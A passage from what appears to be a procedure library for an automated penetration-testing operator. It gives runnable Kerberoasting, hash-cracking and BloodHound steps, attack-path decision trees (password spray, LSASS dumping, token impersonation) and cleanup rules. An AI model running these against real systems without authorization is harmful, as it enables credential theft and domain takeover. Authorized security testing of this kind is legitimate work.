                  provided credentials.
       expected:  Successful authentication
       on_error:  If authentication fails: credentials are invalid or
                  expired. Log failure. Halt — cannot proceed without
                  valid domain credentials.
       log:       "Credential validation: ${username}@${domain} —
                   authentication successful"

    3. ENUMERATE service accounts with SPNs
       action:    impacket-GetUserSPNs ${domain}/${username}:${password}
                  -dc-ip ${dc_ip}
                  -request-user (omit to enumerate all)
       expected:  List of user accounts with servicePrincipalName set,
                  including account name, SPN, password last set date,
                  and delegation status
       on_error:  If no SPNs found: log "No kerberoastable accounts
                  discovered." Procedure completes with empty results
                  — this is a valid outcome, not an error.
                  If access denied: credentials may lack read permission
                  on LDAP attributes. Log and halt.
       log:       "SPN enumeration: [N] kerberoastable accounts discovered
                   Accounts: [list of account names and SPNs]"

    4. EVALUATE discovered accounts
       action:    For each discovered SPN account, assess value:
                  — Is the account a member of privileged groups?
                    (Domain Admins, Enterprise Admins, etc.)
                  — When was the password last set?
                    (Older = more likely weak = higher priority)
                  — Is the account active (enabled)?
                  — Is delegation configured? (unconstrained delegation
                    = high additional value)
       expected:  Prioritized list of target accounts
       on_error:  If LDAP queries for group membership fail: proceed
                  with all discovered accounts — prioritization is
                  optimization, not requirement
       log:       "Account assessment complete: [N] high-value,
                   [M] standard, [K] low-priority"

    5. REQUEST service tickets (Kerberoast)
       action:    impacket-GetUserSPNs ${domain}/${username}:${password}
                  -dc-ip ${dc_ip}
                  -request
                  -outputfile ${output_dir}/kerberoast_hashes.txt
       expected:  Hashcat/john-compatible hash file containing TGS
                  tickets in krb5tgs format
       on_error:  If some requests fail: log per-account failures,
                  continue with successful extractions.
                  If all requests fail: check for AES-only policy
                  (no RC4). If AES-only: extract AES tickets (slower
                  to crack but still viable). Log encryption type.
       log:       "Ticket extraction: [N] tickets obtained
                   ([M] RC4, [K] AES128, [J] AES256)"

    6. VERIFY extracted hashes
       action:    Validate hash file format:
                  — Confirm hashcat mode 13100 (krb5tgs) compatible
                  — Count hashes and match against expected count
                  — Verify file is non-empty
       expected:  Valid hash file with [N] entries matching step 3 count
       on_error:  If hash count mismatch: log discrepancy, investigate
                  which accounts failed extraction
       log:       "Hash verification: [N] valid hashes in output file"

    7. EXECUTE offline cracking (if wordlist provided)
       action:    hashcat -m 13100 ${output_dir}/kerberoast_hashes.txt
                  ${wordlist}
                  -o ${output_dir}/cracked.txt
                  --outfile-format=2
                  -w 3
       expected:  Cracked passwords appended to output file
       on_error:  If hashcat exhausts wordlist without cracks: log
                  "No passwords cracked with provided wordlist."
                  This is a valid outcome. Consider rule-based attacks
                  or larger wordlists if time permits.
                  If hashcat errors: check hash format, check GPU
                  drivers, retry.
       log:       "Offline cracking: [N] of [M] hashes cracked
                   (${percentage}%)"

    8. COMPILE results
       action:    Generate structured results:
                  — All discovered SPN accounts with metadata
                  — Extracted hashes (file reference)
                  — Cracked credentials (if any)
                  — Account privilege levels
                  — Recommended next steps per cracked account
       expected:  Results at ${output_dir}/kerberoast_results.json
       on_error:  Non-critical
       log:       "Results compiled"

    9. CLEAN UP
       action:    — Purge Kerberos ticket cache: kdestroy or
                    klist purge
                  — Verify no cached tickets remain
                  — Remove any temporary files
                  — Do NOT delete hash files or cracked results —
                    these are engagement evidence
       expected:  Ticket cache clean, no temporary artifacts
       on_error:  If ticket cache purge fails: log, attempt
                  manual deletion of cache file
       log:       "Cleanup: ticket cache purged, temporary files
                   removed"

  decision_points:
    — at_step: 3
      condition: Zero SPN accounts discovered
      true_branch: Log "No kerberoastable accounts." Procedure completes
                   successfully with empty result set.
      false_branch: Continue to step 4.

    — at_step: 5
      condition: All tickets extracted with AES encryption only
                 (no RC4 downgrade possible)
      true_branch: Log "AES-only environment." Adjust hashcat mode
                   to 19700 (krb5tgs AES256) or 19600 (AES128).
                   Cracking will be significantly slower — adjust
                   time expectations.
      false_branch: Proceed with standard mode 13100 (RC4).

    — at_step: 7
      condition: Wordlist not provided in input
      true_branch: Skip cracking step. Output hash file only.
                   Flag for separate cracking procedure.
      false_branch: Execute hashcat with provided wordlist.

  output:
    — spn_accounts: list[object] — All discovered SPN accounts with
      metadata
    — hashes: file — Hashcat-compatible hash file
    — cracked_credentials: list[object] — Cracked username/password
      pairs (if cracking was performed)

  evidence:
    — spn_enumeration: Complete SPN account list — ${output_dir}/
    — ticket_extraction: Hash file with timestamps — ${output_dir}/
    — cracking_results: Cracked credentials — ${output_dir}/
      (if applicable)
    — procedure_log: Full execution log with timing

  artifacts:
    — Kerberos ticket cache: Local machine — cleaned in step 9
    — Hash files: ${output_dir}/ — Retain as engagement evidence
    — Cracked results: ${output_dir}/ — Retain as engagement evidence

  cleanup:
    1. Purge Kerberos ticket cache — verify with klist
    2. Remove temporary files — verify with directory listing
    3. Retain hash files and results as evidence

  estimated_duration: 10–30 minutes (enumeration and extraction)
                      + hours to days for offline cracking
  risk_level:         medium (generates Kerberos traffic logged by DC;
                      detectable by advanced monitoring)
  noise_level:        quiet (Kerberos ticket requests are normal
                      domain traffic, but requesting many TGS tickets
                      in rapid succession may trigger detection rules)

  rollback:
    — No target-side state change. Kerberoasting is a read operation
      against the domain controller. No accounts modified, no
      configurations changed.
    — Rollback is limited to purging local ticket cache and
      deleting local output files.

  references:
    — MITRE ATT&CK: T1558.003 (Steal or Forge Kerberos Tickets:
      Kerberoasting)
    — Impacket GetUserSPNs documentation
    — hashcat documentation (mode 13100, 19600, 19700)
```

---

### PROC-POST-002: BloodHound Data Collection

```
PROCEDURE:
  id:             PROC-POST-002
  name:           BloodHound Data Collection (SharpHound / BloodHound.py)
  version:        2.0.0
  last_validated: Current

  implements:     TECH-POST-AD-GRAPH
  classification: post-exploitation

  prerequisites:
    access:       — Valid domain user credentials (any privilege level)
                  — Network access to domain controller and target
                    systems (LDAP, SMB, RPC)
    tools:        — bloodhound-python (v1.6+) — from Linux/Kali
                    OR SharpHound (v2.0+) — from Windows
                  — BloodHound CE or legacy (for graph analysis)
                  — neo4j (if using legacy BloodHound)
    information:  — Domain name (FQDN)
                  — Domain controller IP or hostname
                  — Valid domain credentials
    environment:  — Active Directory environment
                  — LDAP (389/636), SMB (445), and RPC (135) reachable
                    to target systems

  input:
    — domain: string — Domain FQDN — required
    — dc_ip: string — Domain controller IP — required
    — username: string — Domain username — required
    — password: string — Domain password — required
    — collection_method: string — "all" | "dconly" | "session" |
                         "loggedon" | "trusts" | "acl" | "objectprops"
                         (default: "all") — optional
    — stealth: boolean — If true, use DCOnly collection method
               to minimize network noise (default: false) — optional
    — output_dir: path — Results directory — required

  steps:
    1. VERIFY domain controller connectivity
       action:    Test connectivity to DC on TCP 389 (LDAP),
                  TCP 445 (SMB), and TCP 88 (Kerberos).
       expected:  All required ports reachable
       on_error:  If LDAP unreachable: halt — required for all
                  collection methods.
                  If SMB unreachable: DCOnly collection still possible.
                  Log limitation.
       log:       "DC connectivity: LDAP=${ldap_status},
                   SMB=${smb_status}, Kerberos=${kerb_status}"

    2. VERIFY credentials
       action:    Authenticate to LDAP with provided credentials.
       expected:  Successful LDAP bind
       on_error:  If authentication fails: halt — invalid credentials
       log:       "Authentication: ${username}@${domain} — success"

    3. DETERMINE collection method
       action:    If stealth=true: set method to "dconly"
                  If stealth=false: use ${collection_method} or "all"
                  If collection_method="all" and SMB is unreachable:
                  fall back to "dconly" and log limitation
       expected:  Collection method selected and validated
       on_error:  N/A — decision step
       log:       "Collection method: ${method}
                   (stealth=${stealth})"

    4. EXECUTE bloodhound-python collection
       action:    bloodhound-python -d ${domain} -u ${username}
                  -p ${password} -ns ${dc_ip}
                  -c ${method}
                  --zip
                  -o ${output_dir}/
       expected:  ZIP file containing JSON files for each data type:
                  computers.json, users.json, groups.json, domains.json,
                  sessions.json (if applicable), gpos.json, ous.json
       on_error:  If collection hangs: set --timeout flag, retry.
                  If partial collection: log which components succeeded
                  and which failed. Partial data is still valuable.
                  If access denied on specific objects: log, continue —
                  collection is best-effort across the domain.
       log:       "Collection complete: [N] objects collected
                   (users: [U], computers: [C], groups: [G],
                    sessions: [S], GPOs: [P], OUs: [O])"

    5. VERIFY output integrity
       action:    — Verify ZIP file is not corrupt (unzip test)
                  — Verify JSON files are valid JSON
                  — Count objects per type and compare against
                    expected domain size (if known)
       expected:  Valid, parseable data collection
       on_error:  If ZIP corrupt: retry collection.
                  If JSON malformed: retry collection with --no-zip
                  to isolate problematic data type.
       log:       "Output verification: ZIP integrity=OK,
                   JSON validation=OK, total objects=[N]"

    6. TRANSFER data for analysis
       action:    If BloodHound is local: import directly.
                  If BloodHound is remote: transfer ZIP securely.
                  Verify transfer integrity (hash comparison).
       expected:  Data available in BloodHound for graph analysis
       on_error:  If import fails: check BloodHound version
                  compatibility, check data format version
       log:       "Data transferred and imported into BloodHound"

    7. EXECUTE initial graph queries (automated)
       action:    Run standard attack path queries:
                  — Shortest path to Domain Admins
                  — Shortest path to high-value targets
                  — Kerberoastable users with admin paths
                  — AS-REP roastable accounts
                  — Unconstrained delegation systems
                  — Users with DCSync rights
                  — Accounts with paths to Tier 0 assets
       expected:  Query results with identified attack paths
       on_error:  If queries return empty: domain may be well-secured
                  or collection may be incomplete. Log and investigate.
       log:       "Graph analysis: [N] attack paths identified,
                   shortest path to DA: [hops] hops via [path]"

    8. COMPILE results
       action:    Generate structured summary:
                  — Domain statistics (users, computers, groups,
                    trusts, GPOs)
                  — Identified attack paths with risk ratings
                  — High-value targets and their exposure
                  — Recommended next procedures based on findings
       expected:  Results at ${output_dir}/bloodhound_summary.json
       on_error:  Non-critical
       log:       "BloodHound results compiled"

    9. CLEAN UP
       action:    — If SharpHound was used on a Windows target:
                    delete SharpHound binary and output from target
                    system. Verify deletion.
                  — If bloodhound-python was used from operator
                    machine: no target-side cleanup required.
                  — Remove any temporary credential caches.
       expected:  No target-side artifacts (if Linux collection).
                  SharpHound artifacts removed (if Windows collection).
       on_error:  If SharpHound binary cannot be deleted: log
                  and escalate — artifact left on target system.
       log:       "Cleanup: target-side artifacts=${target_cleanup_status},
                   local temp files=removed"

  decision_points:
    — at_step: 3
      condition: stealth=true
      true_branch: Use "dconly" method. This queries only the domain
                   controller via LDAP — no SMB connections to member
                   servers. Less data but much lower detection footprint.
      false_branch: Use "all" or specified method.

    — at_step: 4
      condition: bloodhound-python fails completely
      true_branch: If on a Windows system: attempt SharpHound.exe
                   execution instead. If not: attempt ldapdomaindump
                   as fallback for partial AD enumeration.
      false_branch: Continue with successful collection.

    — at_step: 7
      condition: Shortest path to DA found with 3 or fewer hops
      true_branch: Flag as HIGH PRIORITY finding. This attack path
                   is actionable and should be escalated to operational
                   art for immediate exploitation planning.
      false_branch: Record all paths for strategy evaluation.

  output:
    — bloodhound_data: file — BloodHound-compatible ZIP file
    — attack_paths: list[object] — Identified escalation paths
    — domain_statistics: object — AD environment summary
    — recommendations: list[string] — Suggested next procedures

  evidence:
    — ad_graph_data: Complete BloodHound collection — ${output_dir}/
    — attack_path_analysis: Graph query results — ${output_dir}/
    — domain_summary: Statistical overview — ${output_dir}/

  artifacts:
    — BloodHound ZIP: ${output_dir}/ — Engagement evidence, retain
    — SharpHound binary (if used on Windows target): MUST be
      deleted during cleanup — verify deletion
    — SharpHound output (if generated on target): MUST be
      retrieved and deleted — verify deletion
    — Local credential cache: Purge during cleanup

  cleanup:
    1. Delete SharpHound binary from target (if applicable) —
       verify: file listing of drop location
    2. Delete SharpHound output from target (if applicable) —
       verify: file listing of output location
    3. Purge credential cache — verify: klist / cmdkey
    4. Retain BloodHound data as engagement evidence on
       operator machine

  estimated_duration: 5–60 minutes (dependent on domain size
                      and collection method)
  risk_level:         medium (LDAP queries are logged;
                      SMB connections to many hosts may trigger alerts;
                      SharpHound execution is detected by many EDR
                      products)
  noise_level:        quiet (DCOnly) to loud (all — touches every
                      reachable system via SMB)

  rollback:
    — bloodhound-python from Linux: No target-side state change.
      LDAP queries are read-only. Rollback = delete local files.
    — SharpHound on Windows: Target-side artifacts exist until
      cleaned. Rollback = delete binary + output + verify.

  references:
    — MITRE ATT&CK: T1087.002 (Account Discovery: Domain Account)
    — BloodHound documentation (bloodhound.readthedocs.io)
    — bloodhound-python documentation
    — SharpHound documentation
```

---

### PROC-CLEAN-005: Full Engagement Cleanup Verification

```
PROCEDURE:
  id:             PROC-CLEAN-005
  name:           Full Engagement Cleanup Verification
  version:        1.2.0
  last_validated: Current

  implements:     TECH-CLEAN-FULL-VERIFY
  classification: cleanup

  prerequisites:
    access:       — Same access levels used during the engagement
                    (to verify artifact removal)
                  — Administrative access where artifacts were deployed
    tools:        — SSH / RDP / WinRM clients (for remote verification)
                  — Filesystem utilities (ls, dir, find)
                  — Process utilities (ps, tasklist)
                  — Network utilities (netstat, ss)
                  — Registry utilities (reg, regedit) — Windows only
    information:  — Complete artifact inventory from engagement log
                  — List of all systems touched during engagement
                  — List of all accounts created during engagement
                  — List of all persistence mechanisms deployed
                  — List of all configuration changes made
    environment:  — All previously accessed systems still reachable
                  — Engagement is in cleanup phase

  input:
    — artifact_inventory: object — Complete list of artifacts from
                          engagement execution log — required
    — systems_touched: list[string] — All IPs/hostnames accessed
                       during engagement — required
    — accounts_created: list[object] — All accounts created with
                        system, username, and purpose — required
    — persistence_mechanisms: list[object] — All persistence deployed
                              with system, type, and location — required
    — config_changes: list[object] — All configuration modifications
                      with system, change, and original value — required
    — output_dir: path — Cleanup verification results — required

  steps:
    1. LOAD artifact inventory from engagement log
       action:    Parse the complete engagement execution log.
                  Build a categorized inventory:
                  — Files dropped on target systems
                  — Accounts created
                  — Scheduled tasks / cron jobs created
                  — Registry modifications (Windows)
                  — Services created or modified
                  — Firewall rules modified
                  — Configurations changed
                  — Persistence mechanisms deployed
                  — Active sessions / reverse shells
       expected:  Complete, categorized artifact inventory
       on_error:  If engagement log is incomplete: compare against
                  procedure execution logs for each procedure run
                  during the engagement. Build inventory from
                  individual procedure artifacts sections.
       log:       "Artifact inventory loaded: [N] files, [M] accounts,
                   [K] persistence mechanisms, [J] config changes,
                   [P] active sessions"

    2. TERMINATE all active sessions and callbacks
       action:    For each active reverse shell, SSH session, RDP
                  connection, or C2 callback:
                  — Terminate the session gracefully
                  — Verify termination (process list on target)
                  — Kill any lingering listener processes on
                    operator infrastructure
       expected:  Zero active sessions remaining
       on_error:  If session cannot be terminated gracefully: force
                  kill. If process on target cannot be killed: log
                  and escalate — this is a critical cleanup failure.
       log:       "Active sessions terminated: [N] of [M] confirmed
                   closed"

    3. REMOVE persistence mechanisms
       action:    For each persistence mechanism in the inventory:
                  — Navigate to the system where it was deployed
                  — Remove the mechanism:
                    • Scheduled tasks: schtasks /delete or crontab -r
                    • Services: sc delete or systemctl disable + remove
                    • Registry run keys: reg delete
                    • Startup folder items: file deletion
                    • WMI subscriptions: removal commands
                    • Web shells: file deletion
                  — VERIFY removal:
                    • Re-check: does the task/service/key/file
                      still exist? It must not.
                    • Re-check: does the mechanism trigger?
                      It must not.
       expected:  All persistence mechanisms removed and verified absent
       on_error:  If removal fails: try alternative removal method.
                  If still fails: document the failure with exact
                  location and mechanism type. This becomes a client
                  deliverable — "we were unable to remove X;
                  client action required."
       log:       "Persistence removal: [N] of [M] mechanisms
                   removed and verified.
                   Failures: [list, if any]"

    4. REMOVE dropped files
       action:    For each file in the artifact inventory:
                  — Navigate to the target system
                  — Delete the file
                  — VERIFY deletion: ls/dir the path — file must
                    not exist
                  — If file was in a directory created by the
                    engagement: remove the directory if empty
       expected:  All dropped files deleted and verified absent
       on_error:  If file is locked: check for running processes using
                  it. Kill process, then delete.
                  If file cannot be found: it may have been moved by
                  defense tools (quarantine). Log and note in report.
                  If deletion is denied: log as cleanup failure
                  requiring client action.
       log:       "File removal: [N] of [M] files removed and
                   verified. Failures: [list, if any]"

    5. REMOVE created accounts
       action:    For each account in the accounts_created list:
                  — Delete the account from the target system:
                    • AD accounts: net user /delete or Remove-ADUser
                    • Local accounts: net user /delete or userdel
                    • Application accounts: application-specific
                      removal
                  — VERIFY: query user database — account must
                    not exist
                  — VERIFY: attempt authentication with the account
                    — it must fail
       expected:  All engagement-created accounts deleted
       on_error:  If account has dependencies (running services, file
                  ownership): document dependencies, remove account
                  after resolving dependencies.
                  If account cannot be deleted: log as cleanup failure
                  requiring client action.
       log:       "Account removal: [N] of [M] accounts removed
                   and verified non-functional. Failures: [list]"

    6. RESTORE configuration changes
       action:    For each configuration change in the inventory:
                  — Restore the original value:
                    • Firewall rules: restore original ruleset
                    • Service configurations: restore original settings
                    • Group memberships: remove added memberships
                    • File permissions: restore original ACLs
                  — VERIFY: check current configuration matches
                    original pre-engagement state
       expected:  All configurations restored to pre-engagement state
       on_error:  If original value was not recorded: log as cleanup
                  failure. This is a procedure-level failure — original
                  values should always be recorded before modification.
                  Flag for process improvement.
       log:       "Configuration restoration: [N] of [M] changes
                   reverted and verified. Failures: [list]"

    7. VERIFY cleanup completeness — SECOND PASS
       action:    Independent verification pass across all touched
                  systems:
                  — Scan filesystem for known tool signatures
                  — Check scheduled tasks / cron for engagement artifacts
                  — Check services for engagement artifacts
                  — Check running processes for engagement tools
                  — Check network connections for engagement callbacks
                  — Check user accounts for engagement accounts
                  — Check registry (Windows) for engagement modifications
       expected:  ZERO engagement artifacts discovered on second pass
       on_error:  If artifacts found: remove them (return to steps 3–6
                  as appropriate) and run second pass again. This loop
                  continues until the second pass is completely clean.
       log:       "Second pass verification: [N] systems checked,
                   [M] residual artifacts found (should be 0)"

    8. CLEAN operator infrastructure
       action:    — Delete engagement-specific files from operator
                    systems (scan outputs, credential files, tool
                    configs) per data retention policy
                  — Purge credential caches
                  — Terminate engagement-specific infrastructure
                    (C2 servers, redirectors, phishing infrastructure)
                  — Verify no target data remains on operator
                    infrastructure beyond what is required for
                    the report
       expected:  Operator infrastructure clean per retention policy
       on_error:  Non-critical — operator-side cleanup does not affect
                  client systems
       log:       "Operator infrastructure cleanup: complete"

    9. GENERATE cleanup report
       action:    Produce comprehensive cleanup verification document:
                  — Complete artifact inventory (what was there)
                  — Removal status for each artifact (removed/failed)
                  — Verification evidence for each removal
                  — Any cleanup failures requiring client action
                  — Second pass results
                  — Operator infrastructure cleanup status
       expected:  Cleanup report at ${output_dir}/cleanup_report.json
                  and ${output_dir}/cleanup_report.md (human-readable)
       on_error:  Non-critical — but the cleanup report is a required
                  engagement deliverable
       log:       "Cleanup report generated"

    10. OBTAIN client confirmation
        action:    Deliver cleanup report to client.
                   Request client confirmation that:
                   — All identified artifacts have been addressed
                   — Any cleanup failures noted in the report have
                     been resolved by the client's team
                   — The client is satisfied with the engagement
                     cleanup
        expected:  Client sign-off on cleanup completion
        on_error:  If client identifies additional artifacts: return
                   to step 3 and address. If client has concerns:
                   address them until resolution.
        log:       "Client cleanup confirmation: ${status}"

  decision_points:
    — at_step: 7
      condition: Second pass finds residual artifacts
      true_branch: Return to the appropriate removal step (3–6).
                   Remove discovered artifacts. Re-run second pass.
                   Repeat until clean.
      false_branch: Proceed to step 8.

    — at_step: 3 (per mechanism)
      condition: Removal of persistence mechanism fails
      true_branch: Try alternative removal method. If still fails:
                   document as client-action-required item.
                   Do NOT leave the engagement without attempting
                   every reasonable removal approach.
      false_branch: Continue to next mechanism.

  output:
    — cleanup_report: object — Complete cleanup verification with
      per-artifact status
    — unresolved_items: list[object] — Artifacts that could not be
      removed (requires client action)
    — client_signoff: boolean — Whether client confirmed cleanup

  evidence:
    — cleanup_verification: Complete cleanup report with evidence of
      each removal — ${output_dir}/
    — second_pass_results: Verification scan results — ${output_dir}/

  artifacts:
    — This procedure generates reports but should not create new
      target-side artifacts. Any tools or scripts used for verification
      must also be cleaned up.

  cleanup:
    — This IS the cleanup procedure. It cleans itself by including
      its own verification tools in the artifact inventory for the
      second pass.

  estimated_duration: 1–8 hours (dependent on engagement scope,
                      number of systems touched, and artifact count)
  risk_level:         low (cleanup operations are authorized and
                      expected)
  noise_level:        quiet (remote access and file operations only)

  rollback:
    — Cleanup is not rollable. Deleted files are deleted.
      Removed accounts are removed. If cleanup must be stopped
      partway through, document the current state and resume
      from the last completed step.
    — If an artifact is accidentally deleted that should have
      been preserved (evidence): this is a significant procedural
      error. Evidence should be extracted and secured BEFORE
      cleanup begins.

  references:
    — Engagement methodology: cleanup phase requirements
    — Client contract: cleanup and restoration obligations
    — Doctrine: "The Operator Is a Guest" principle
```

---

## IV — Decision Trees: Procedure Selection

The machine does not browse the procedure library and choose one by feel. It follows decision logic that maps operational context to the appropriate procedure. This section defines the decision trees for common operational scenarios.

### 4.1 — "I Have a Web Application Login Page"

```
CONTEXT: Active web application with login form discovered.
QUESTION: Which procedures are applicable?

  ┌─────────────────────────────────────────────────────┐
  │ Web Application Login Page Discovered               │
  └──────────────────────┬──────────────────────────────┘
                         │
                         ▼
  ┌─────────────────────────────────────────────────────┐
  │ Do we have candidate usernames?                     │
  ├── YES ──────────────────────────────────┐           │
  ├── NO ───────────────────────┐           │           │
  └─────────────────────────────┘           │           │
           │                                │
           ▼                                ▼
  PROC-ENUM-005:                   Do we have candidate
  Web directory/endpoint           passwords?
  brute-force to find              ├── YES → PROC-EXPLOIT-001:
  additional login endpoints,      │         Password spray
  API docs, or user enumeration    │
  vectors                          ├── NO  → PROC-REC-004:
           │                       │         Breach credential
           ▼                       │         correlation to build
  PROC-REC-004:                    │         password list
  Breach credential correlation    │
  (can we find usernames from      │         THEN → PROC-EXPLOIT-001
  breach data?)                    │
           │                       │
           ▼                       │
  Authentication timing analysis   │
  (can we enumerate valid users    │
  by response time differential?)  │
           │                       │
           ▼                       │
  PROC-EXPLOIT-001: Password       │
  spray with discovered users      │
  and breach-derived passwords     │
                                   │
  PARALLEL PATH (always):         │
  ├── PROC-EXPLOIT-002: SQL injection testing on login form
  ├── PROC-REC-005: Technology stack fingerprinting
  │   (identify framework, CMS, WAF)
  └── Default credential testing (admin:admin, etc.)
```

### 4.2 — "I Have Domain User Credentials"

```
CONTEXT: Valid domain user credentials obtained (any privilege level).
QUESTION: Which escalation and enumeration procedures apply?

  ┌─────────────────────────────────────────────────────┐
  │ Domain User Credentials Available                   │
  └──────────────────────┬──────────────────────────────┘
                         │
            ┌────────────┼────────────────┐
            │            │                │
            ▼            ▼                ▼
  IMMEDIATE         IMMEDIATE         IMMEDIATE
  (parallel):       (parallel):       (parallel):

  PROC-POST-002:   PROC-EXPLOIT-004: PROC-ENUM-004:
  BloodHound       Kerberoasting     LDAP enumeration
  data collection  (extract TGS      (users, groups,
  (map AD attack   tickets for       GPOs, trusts,
  paths)           offline crack)    OUs, ACLs)

            │            │                │
            └────────────┼────────────────┘
                         │
                         ▼
  ┌─────────────────────────────────────────────────────┐
  │ ANALYZE results from parallel procedures            │
  └──────────────────────┬──────────────────────────────┘
                         │
         ┌───────────────┼───────────────┐
         │               │               │
         ▼               ▼               ▼
  BloodHound shows   Kerberoast      LDAP reveals
  path to DA via     cracks a        AS-REP roastable
  AD CS ESC1?        service         accounts?
  → PROC-EXPLOIT-005 account         → PROC-EXPLOIT-007
                     password?         (AS-REP roasting)
                     → Use new creds,
                       re-evaluate     LDAP reveals
                       access level    unconstrained
                                       delegation?
                     BloodHound shows  → PROC-EXPLOIT-008
                     path via           (delegation abuse)
                     GenericAll /
                     WriteDacl?        Domain trusts
                     → PROC-EXPLOIT-009 found?
                       (ACL abuse)     → PROC-POST-006
                                        (trust enumeration)
```

### 4.3 — "I Have Local Admin on a Windows Workstation"

```
CONTEXT: Local administrator access on a domain-joined Windows system.
QUESTION: Which credential harvesting and escalation procedures apply?

  ┌─────────────────────────────────────────────────────┐
  │ Local Admin on Domain-Joined Windows Workstation    │
  └──────────────────────┬──────────────────────────────┘
                         │
         ┌───────────────┼───────────────┐
         │               │               │
         ▼               ▼               ▼
  PROC-POST-001:   PROC-POST-004:   Check: Is
  LSASS credential Windows priv     SeImpersonate
  dump (extract    esc enumeration  privilege held?
  NTLM hashes,    (check for       ├── YES →
  Kerberos         additional local │   PROC-EXPLOIT-006:
  tickets, clear-  escalation       │   Token impersonation
  text if WDIGEST  paths —          │   (PrintSpoofer /
  enabled)         services,        │   GodPotato)
         │         unquoted paths,  ├── NO →
         │         AlwaysInstall-   │   Continue with
         │         Elevated, etc.)  │   other paths
         │               │               │
         ▼               ▼               ▼
  Credentials      Additional        Check: Any logged-on
  obtained?        local esc paths   domain admins?
  ├── YES:         found?            (via quser, tasklist,
  │   Evaluate     ├── YES: Execute  or session enum)
  │   privilege    │   appropriate    ├── YES →
  │   level of     │   exploitation  │   PROC-POST-001 to
  │   dumped       │   procedure     │   capture their
  │   accounts     ├── NO: Continue  │   token/hash
  │                │   with obtained ├── NO →
  │   Domain       │   local admin   │   Monitor or move
  │   admin hash?  │                 │   to another system
  │   → Direct to  │
  │     DC         │
  │   Domain user  │
  │   hash?        │
  │   → Re-enter   │
  │     at 4.2     │
  │     (domain    │
  │     user       │
  │     decision   │
  │     tree)      │
  ├── NO:          │
  │   Consider     │
  │   alternative  │
  │   dump methods │
  │   (SAM, LSA    │
  │   secrets,     │
  │   DPAPI)       │
  └────────────────┘

  PARALLEL (always when local admin):
  ├── PROC-POST-002: BloodHound from this position
  ├── Network share enumeration from this host
  ├── Check for saved credentials (cmdkey, browser, vault)
  └── Check for cached GPP passwords
```

### 4.4 — "Engagement Objective Reached"

```
CONTEXT: Primary engagement objective has been achieved.
QUESTION: What evidence collection and closure procedures execute?

  ┌─────────────────────────────────────────────────────┐
  │ Engagement Objective Achieved                       │
  └──────────────────────┬──────────────────────────────┘
                         │
                         ▼
  1. EVIDENCE COLLECTION (before anything is cleaned up):
     — Screenshot/recording of objective achievement
     — Full command log from the session that achieved objective
     — Network path documentation (how we got here)
     — Complete attack chain documentation:
       entry point → each pivot → objective

                         │
                         ▼
  2. CONTINUED ASSESSMENT (if time and ROE permit):
     — Are there additional objectives?
     — Are there additional attack paths to the same objective?
       (defense-in-depth assessment)
     — Can we demonstrate additional impact?

                         │
                         ▼
  3. CLEANUP SEQUENCE:
     — PROC-CLEAN-003: Persistence mechanism removal (all)
     — PROC-CLEAN-002: Account removal (all created accounts)
     — PROC-CLEAN-001: File artifact removal (all dropped files)
     — PROC-CLEAN-004: Configuration restoration (all changes)
     — PROC-CLEAN-005: Full engagement cleanup VERIFICATION
       (independent second pass across ALL systems)

                         │
                         ▼
  4. REPORTING INPUT:
     — All procedure execution logs → report generator
     — Evidence files → report appendices
     — Attack path documentation → finding descriptions
     — Cleanup verification → cleanup section of report
```

---

## V — Error Handling and Contingency

### 5.1 — Standard Error Handling Patterns

Every procedure encounters errors. The difference between a human operator's error handling — improvised, experience-dependent, inconsistent — and the machine's error handling is structure. The machine follows the same error handling patterns across every procedure, every tool, every step.

```
ERROR HANDLING HIERARCHY:

  LEVEL 1 — RETRY
    Condition:  Transient failure (network timeout, connection reset,
                tool process crash, temporary resource unavailability)
    Response:   Wait (exponential backoff: 5s → 10s → 20s → 60s)
                Retry the same action with the same parameters
                Maximum retries: 3 (configurable per procedure)
    Outcome:    If retry succeeds: continue procedure from this step
                If all retries fail: escalate to Level 2

  LEVEL 2 — ALTERNATIVE TOOL
    Condition:  Primary tool fails persistently
    Response:   Switch to the alternative tool specified in the
                procedure's tool list
                Example: rustscan fails → masscan → nmap
                Example: impacket fails → Rubeus
                Example: bloodhound-python fails → ldapdomaindump
    Outcome:    If alternative succeeds: continue procedure
                If no alternative available or all alternatives fail:
                escalate to Level 3

  LEVEL 3 — ALTERNATIVE APPROACH
    Condition:  The specific method fails regardless of tool
    Response:   Log the failure with full diagnostics
                Evaluate whether an alternative procedure achieves
                the same technique objective
                Example: Kerberoasting blocked → try AS-REP roasting
                Example: LDAP enumeration blocked → try RPC enumeration
    Outcome:    If alternative procedure available: execute it
                If no alternative: escalate to Level 4

  LEVEL 4 — LOG AND SKIP
    Condition:  The technique cannot be executed by any available method
    Response:   Log the failure with complete details:
                — What was attempted
                — What failed
                — Error messages and diagnostic output
                — What alternatives were tried
                Mark this technique as "blocked" in the engagement log
                Continue with remaining procedures
    Outcome:    The engagement continues. The blocked technique is
                documented in the final report as "attempted and failed."

  LEVEL 5 — HALT AND ESCALATE
    Condition:  The error indicates a potential scope violation,
                security control malfunction, service disruption,
                or other condition requiring human judgment
    Response:   HALT the current procedure immediately
                HALT all related parallel procedures
                Escalate to the human principal with:
                — What happened
                — What the potential impact is
                — What has been done so far
                — What the recommended action is
                Wait for principal direction before proceeding
    Outcome:    Principal decides: resume, abort, or modify approach
```

### 5.2 — Critical Error Conditions

```
ERRORS THAT ALWAYS TRIGGER LEVEL 5 (HALT AND ESCALATE):

  SCOPE VIOLATION SUSPECTED:
    A procedure's target validation identifies a system that
    may be outside the authorized scope.
    → HALT. Do not proceed. Escalate immediately.

  SERVICE DISRUPTION DETECTED:
    A target service stops responding during or after a procedure
    step, and the service was operational before the step.
    → HALT. Log everything. Escalate immediately.
    → Follow doctrine's operational impact protocol.

  ACCOUNT LOCKOUT TRIGGERED:
    During a credential-based procedure, account lockout is
    detected for any account.
    → HALT credential operations. Log. Escalate.
    → Do NOT retry with the same account.

  UNEXPECTED ADMINISTRATIVE ACCESS:
    A procedure produces a result that grants higher access than
    expected (e.g., a local exploit returns SYSTEM on a domain
    controller when the target was a workstation).
    → PAUSE. Validate the result. Confirm the target is in scope
      at this access level. If in scope: log and continue.
      If scope is ambiguous: escalate.

  DATA EXPOSURE:
    A procedure exposes sensitive data (PII, financial records,
    medical records, etc.) beyond what is needed for the
    engagement objective.
    → Note the exposure for the report. Do NOT copy, exfiltrate,
      or retain the data unless the ROE explicitly requires it.
    → Handle per doctrine's data handling requirements.
```

### 5.3 — The Machine's Error Discipline

```
THE MACHINE'S ERROR HANDLING IS NOT TROUBLESHOOTING.

  A human encountering an error troubleshoots: they guess,
  they try things, they search the internet, they ask a colleague.
